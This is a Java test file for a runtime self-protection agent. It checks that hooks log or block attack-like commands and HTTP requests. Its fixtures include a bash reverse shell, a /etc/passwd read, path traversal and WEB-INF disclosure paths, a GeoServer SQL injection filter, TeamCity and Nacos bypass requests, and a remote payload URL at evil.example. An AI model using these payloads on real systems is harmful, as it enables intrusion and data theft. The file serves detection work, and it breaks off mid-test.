package io.ohmyrasp.agent.java17;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.beans.Statement;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.ObjectStreamClass;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;

final class Java17RaspHooksTest {
  private static final String HUGEGRAPH_DEFAULT_JWT =
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
          + "eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9."
          + "mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg";
  private static final String HUGEGRAPH_TAMPERED_JWT =
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
          + "eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9."
          + "mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqa";
  private static final String DATAEASE_WRONG_SIGNATURE_JWT =
      "eyJhbGciOiJIUzI1NiJ9."
          + "eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjo5NzM5NTIzNDgzfQ."
          + "7zfY8mKIUd0Q6AMp3_hxGNgF-KMkED7vc0PSH5vO4cQ";

  @AfterEach
  void clearProperties() {
    System.clearProperty("ohmyrasp.java17.log");
    System.clearProperty("ohmyrasp.java17.block");
    System.clearProperty("catalina.home");
    System.clearProperty("activemq.home");
  }

  @Test
  void ignoresNormalProcessBuilderCommand() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeProcessBuilderStart(new ProcessBuilder("/bin/true"));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsSuspiciousProcessBuilderCommand() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-suspicious", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeProcessBuilderStart(new ProcessBuilder("sh", "-c", "cat /etc/passwd"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"event\":\"ohmyrasp-detection\""));
    assertTrue(text.contains("\"algorithm\":\"java17_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"log\""));
  }

  @Test
  void logsShellMetacharacterProcessBuilderCommand() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-shell-meta", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeProcessBuilderStart(new ProcessBuilder("sh", "-c", "echo safe; id"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_command_execution_shell_meta\""));
    assertTrue(text.contains("\"action\":\"log\""));
  }

  @Test
  void ignoresBenignTtyProbeShellCommand() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-tty-probe", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeProcessBuilderStart(new ProcessBuilder("sh", "-c", "stty -g < /dev/tty"));
    Java17RaspHooks.beforeProcessBuilderStart(new ProcessBuilder("sh", "-c", "stty -a < /dev/tty"));
    Java17RaspHooks.beforeProcessBuilderStart(
        new ProcessBuilder("sh", "-c", "stty -icanon min 1 -icrnl -inlcr -ixon < /dev/tty"));

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresBenignLocalBrowserLaunchShellCommand() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-local-browser", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeProcessBuilderStart(
        new ProcessBuilder(
            "sh",
            "-c",
            "xdg-open \"http://localhost:8080\" || firefox \"http://localhost:8080\" || mozilla \"http://localhost:8080\" || konqueror \"http://localhost:8080\" || opera \"http://localhost:8080\""));

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresPlainShellScriptFileOutsideSchedulerStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-plain-shell-file", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeProcessBuilderStart(new ProcessBuilder("sh", "/tmp/maintenance.sh"));

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksXStreamDeserializationProcessBuilderCommandWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-xstream-command", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            com.thoughtworks.xstream.core.TreeUnmarshaller.invokeJava17ProcessBuilderStart(
                new ProcessBuilder("touch", "/tmp/ohmyrasp-s2052-success")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("XML polymorphic deserialization reached a Java 17 process sink"));
    assertTrue(text.contains("touch /tmp/ohmyrasp-s2052-success"));
  }

  @Test
  void blocksJiffleRuntimeCommandStackWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jiffle-command", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            it.geosolutions.jaiext.jiffle.runtime.JiffleIndirectRuntimeImpl
                .invokeJava17JiffleRuntimeCommand());

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("Jiffle runtime reached a Java 17 process sink"));
    assertTrue(text.contains("\"command\":\"id\""));
  }

  @Test
  void ignoresKkFileViewOfficeCleanupCommands() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-office-cleanup", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    cn.keking.service.OfficePluginManager.invokeJava17OfficeCountCommand();
    cn.keking.service.OfficePluginManager.invokeJava17OfficeKillCommand();

    assertFalse(Files.exists(log));
  }

  @Test
  void logsXxlJobSchedulerScriptCommandStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-xxljob-shell", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    com.xxl.job.core.handler.impl.ScriptJobHandler.invokeJava17GlueShell();

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_command_execution_shell_meta\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("/data/applogs/xxl-job/jobhandler/gluesource/1_1586699003758.sh"));
  }

  @Test
  void blocksXxlJobSchedulerScriptCommandStackWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-xxljob-shell-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () -> com.xxl.job.core.handler.impl.ScriptJobHandler.invokeJava17GlueShell());

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_command_execution_shell_meta\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresPlainRuntimeTouchCommandOutsideExpressionStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-runtime-touch-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeRuntimeExecString("touch /tmp/ohmyrasp-unomi-touch-success");

    assertFalse(Files.exists(log));
  }

  @Test
  void logsSpringBeanInitializationProcessCommandStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-spring-bean-process", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    org.springframework.context.support.AbstractApplicationContext
        .invokeJava17SpringBeanInitTouchCommand();

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("touch /tmp/ohmyrasp-activemq46604-success"));
  }

  @Test
  void ignoresTikaExternalParserVersionCheckDuringSpringInitialization() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-tika-version-check", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    org.springframework.context.support.AbstractApplicationContext
        .invokeJava17SpringBeanInitTikaCheck();

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresGetconfClockTickDuringSpringInitialization() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-getconf-clktck", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    org.springframework.context.support.AbstractApplicationContext
        .invokeJava17SpringBeanInitGetconfClockTick();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava17SpringBeanInitGetconfPageSize();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava17SpringBeanInitLscpuTopology();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava17SpringBeanInitVcgenTemperature();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava17SpringBeanInitDmidecodeProcessorProbe();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava17SpringBeanInitCpuidProbe();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava17SpringBeanInitOsReleaseProbe();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava17SpringBeanInitLdconfigProbe();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava17SpringBeanInitUnameProbe();

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresIdentityProbeDuringSpringInitialization() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-spring-id-probe", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    org.springframework.context.support.AbstractApplicationContext
        .invokeJava17SpringBeanInitIdentityProbe();

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresTeamCityMetadataVerifierDuringSpringInitialization() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-teamcity-metadata", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    org.springframework.context.support.AbstractApplicationContext
        .invokeJava17SpringBeanInitTeamCityMetadataVerifier();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava17SpringBeanInitTeamCityServerJarMetadataVerifier();

    assertFalse(Files.exists(log));
  }

  @Test
  void logsExpressionLanguageRuntimeCommandStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-mvel-runtime", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    org.mvel2.MVEL.invokeJava17TouchCommand();

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("touch /tmp/ohmyrasp-unomi-touch-success"));
  }

  @Test
  void logsElasticsearchShadedMvelRuntimeCommandStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-es-mvel-runtime", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    org.elasticsearch.common.mvel2.MVEL.invokeJava17TouchCommand();

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("touch /tmp/ohmyrasp-es-3120-success"));
  }

  @Test
  void blocksExpressionLanguageRuntimeCommandWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-mvel-runtime-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(Java17RaspBlockException.class, () -> org.mvel2.MVEL.invokeJava17TouchCommand());

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void blocksElasticsearchShadedMvelRuntimeCommandWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-es-mvel-runtime-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () -> org.elasticsearch.common.mvel2.MVEL.invokeJava17TouchCommand());

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void logsSolrRunExecutableListenerCommandStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-solr-runexec", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    org.apache.solr.core.RunExecutableListener.invokeJava17TouchCommand();

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("touch /tmp/ohmyrasp-solr12629-success"));
  }

  @Test
  void logsDatabaseJavaRoutineCommandStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-derby-routine", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    org.apache.derby.impl.sql.execute.DerbyRoutineCommandProbe.invokeJava17IdCommand();

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"command\":\"id\""));
  }

  @Test
  void blocksWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeProcessBuilderStart(
                new ProcessBuilder("bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresNormalHttpRequestPath() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-request-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeHttpRequest(new RequestStub("GET", "/admin/login.jsp", ""));
    Java17RaspHooks.beforeHttpRequest(new RequestStub("GET", "/WEB-INF/web.xml", ""));

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresTeamCityInstallLinksFragmentPathWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-teamcity-installlinks", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/admin/../installLinks.jspf", ""));
    Java17RaspHooks.afterHttpRequest();

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksTeamCityDebugProcessLaunchWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-teamcity-debug-process", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeHttpRequest(
                new RequestStub("POST", "/app/rest/debug/processes", "exePath=id")
                    .withParameter("exePath", "id")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_debug_process_launch\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("parameter=exePath"));
    assertTrue(text.contains("commandLength=2"));
    assertTrue(text.contains("value=[redacted]"));
    assertFalse(text.contains("exePath=id"));
  }

  @Test
  void ignoresDebugProcessRequestWithoutExecutableParameter() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-teamcity-debug-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub("POST", "/app/rest/debug/processes", "locator=all")
            .withParameter("locator", "all"));
    Java17RaspHooks.afterHttpRequest();

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresExecutableParameterOutsideDebugProcessContext() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-teamcity-debug-outside", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub("POST", "/app/rest/builds", "exePath=id")
            .withParameter("exePath", "id"));
    Java17RaspHooks.afterHttpRequest();

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksTeamCityInternalForwardWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-teamcity-forward-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeHttpRequest(
                new RequestStub("GET", "/hax", "jsp=/app/rest/users;.jsp")
                    .withParameter("jsp", "/app/rest/users;.jsp")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_internal_forward\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("target=/app/rest/users;.jsp"));
  }

  @Test
  void logsEncodedTeamCityInternalForward() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-teamcity-forward-encoded", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/hax", "jsp=%2Fapp%2Frest%2Fusers%3B.jsp")
            .withParameter("jsp", "%2Fapp%2Frest%2Fusers%3B.jsp"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_internal_forward\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("target=/app/rest/users;.jsp"));
  }

  @Test
  void ignoresInternalForwardWithoutServletSuffixConfusion() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-teamcity-forward-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/hax", "jsp=/app/rest/users")
            .withParameter("jsp", "/app/rest/users"));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsForgedIncludeProtectedWebResourceAttribute() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-forged-include", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/asdf", "")
            .withAttribute("javax.servlet.include.request_uri", "/")
            .withAttribute("javax.servlet.include.path_info", "WEB-INF/web.xml")
            .withAttribute("javax.servlet.include.servlet_path", "/"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_forged_include_attribute\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("WEB-INF/web.xml"));
  }

  @Test
  void blocksForgedIncludeProtectedWebResourceAttributeWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-forged-include-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeHttpRequest(
                new RequestStub("GET", "/asdf", "")
                    .withAttribute("javax.servlet.include.path_info", "WEB-INF/web.xml")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_forged_include_attribute\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresRequestDispatcherIncludeAttributes() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-forged-include-dispatcher", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    ApplicationDispatcher.include(
        new RequestStub("GET", "/page", "")
            .withAttribute("javax.servlet.include.request_uri", "/")
            .withAttribute("javax.servlet.include.path_info", "WEB-INF/web.xml")
            .withAttribute("javax.servlet.include.servlet_path", "/"));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsJettyEncodedDotWebInfDisclosurePath() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jetty-webinf", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeHttpRequest(new RequestStub("GET", "/%2e/WEB-INF/web.xml", ""));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_path_confusion\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("/WEB-INF/web.xml"));
  }

  @Test
  void blocksJettyEncodedDotWebInfDisclosurePathWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jetty-webinf-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () -> Java17RaspHooks.beforeHttpRequest(new RequestStub("GET", "/%2e/WEB-INF/web.xml", "")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_path_confusion\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void logsOpenfireUnicodeEscapedSetupTraversal() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-openfire-unicode", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub(
            "GET",
            "/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp",
            "csrf=csrftoken"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_path_confusion\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("/setup/setup-s/../../user-create.jsp"));
  }

  @Test
  void blocksOpenfireLenientHexSetupTraversalWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-openfire-lenient", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeHttpRequest(
                new RequestStub(
                    "GET",
                    "/setup/setup-s/%2>%2>/%2>%2>/user-create.jsp",
                    "csrf=csrftoken")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_path_confusion\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("/setup/setup-s/../../user-create.jsp"));
  }

  @Test
  void blocksGeoServerCqlFilterSqlInjectionWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-geoserver-cql", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    String filter =
        "strStartsWith(name,'x'') = true and 1=(SELECT CAST ((SELECT version()) AS integer))"
            + " -- ') = true";

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeHttpRequest(
                new RequestStub(
                        "GET",
                        "/geoserver/ows",
                        "service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example")
                    .withParameter("service", "wfs")
                    .withParameter("request", "GetFeature")
                    .withParameter("typeName", "vulhub:example")
                    .withParameter("CQL_FILTER", filter)));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_ogc_filter_sql_injection\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("parameter=CQL_FILTER"));
    assertTrue(text.contains("value=[redacted]"));
    assertFalse(text.contains("SELECT version"));
  }

  @Test
  void ignoresNormalGeoServerCqlFilter() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-geoserver-cql-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub(
                "GET",
                "/geoserver/ows",
                "service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example")
            .withParameter("service", "wfs")
            .withParameter("request", "GetFeature")
            .withParameter("typeName", "vulhub:example")
            .withParameter("CQL_FILTER", "strStartsWith(name,'x') = true"));
    Java17RaspHooks.afterHttpRequest();

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksInternalServiceIdentityOnSensitiveControlPath() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-internal-identity", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeHttpRequest(
                new RequestStub(
                        "POST", "/nacos/v1/auth/users", "username=vulhub&password=vulhub")
                    .withHeader("User-Agent", "Nacos-Server")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_internal_identity\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("/nacos/v1/auth/users"));
  }

  @Test
  void ignoresInternalServiceIdentityOnNonControlPath() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-internal-identity-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/nacos/v1/ns/instance/list", "serviceName=demo")
            .withHeader("User-Agent", "Nacos-Server"));

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresNormalUserAgentOnSensitiveControlPath() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-internal-identity-user", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/nacos/v1/auth/users", "pageNo=1&pageSize=9")
            .withHeader("User-Agent", "Mozilla/5.0"));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsRemoteTemplateSourceParameterOnControlPath() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-template-source", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub(
                "POST",
                "/webtools/control/forgotPassword/StatsSinceStart",
                "statsDecoratorLocation=http%3A%2F%2Fevil.example%2Fofbiz%2Fpayload.xml")
            .withParameter(
                "statsDecoratorLocation", "http://evil.example/ofbiz/payload.xml"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_template_source\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("parameter=statsDecoratorLocation"));
    assertTrue(text.contains("target=remote-url"));
    assertFalse(text.contains("evil.example"));
  }

  @Test
  void ignoresRemoteTemplateSourceParameterOutsideControlPath() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-template-source-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub("POST", "/api/preferences", "")
            .withParameter(
                "statsDecoratorLocation", "http://evil.example/ofbiz/payload.xml"));
